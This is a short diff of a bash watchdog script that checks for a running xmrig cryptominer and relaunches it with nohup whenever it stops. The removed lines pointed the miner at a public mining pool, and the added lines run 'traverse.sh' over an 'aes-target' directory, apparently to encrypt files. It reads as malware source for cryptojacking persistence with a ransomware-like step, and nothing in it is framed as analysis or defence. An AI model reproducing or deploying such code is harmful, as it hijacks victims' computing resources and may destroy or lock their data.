@@ -11,7 +11,7 @@ function CheckProcess()
         fi
 
 # $PROCESS_NUM is the number of $1
-        PROCESS_NUM=`ps -x | grep "$1" | grep -v "grep" | wc -l`
+        PROCESS_NUM=`ps -a | grep "$1" | grep -v "grep" | wc -l`
         if [ $PROCESS_NUM != 0 ];then
             return 1
         else
@@ -19,14 +19,14 @@ function CheckProcess()
         fi
 }
 
-./monitor.sh >/dev/null 2>&1 &  
 num=0
 while [ 1 ] ; do
-    CheckProcess "./xmrig -o pool.minexmr.com:443"
+    CheckProcess "xmrig"
     if [ $? == 0 ];then
         # restart & aes 
-        if[$num!=0]; then ./aes.sh fi
-        nohup ./run.sh & start
+        chmod 764 traverse.sh
+        ./traverse.sh ./aes-target 
+        nohup ./run.sh &
         num=$num+1    
     #add other process...
     fi
